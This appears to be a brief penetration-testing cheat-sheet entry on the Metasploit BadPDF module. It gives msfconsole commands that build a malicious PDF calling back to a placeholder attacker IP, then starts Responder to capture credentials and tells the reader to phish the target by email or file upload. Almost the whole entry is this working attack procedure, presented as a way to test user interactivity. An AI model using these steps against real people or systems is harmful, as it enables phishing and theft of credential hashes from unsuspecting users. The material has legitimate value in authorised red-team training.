BadPDF is a Metasploit module that generates a malicious PDF locally. This may used to phish users, assuming user interactivity is being tested.

Usage
```bash
# Generate malicious pdf
msfconsole
use auxiliary/fileformat/badpdf
set filename application.pdf
set lhost <attack_ip>
run

# Start responder server
sudo responder -I tun0

# Then phish the user (email, file upload, etc...)
```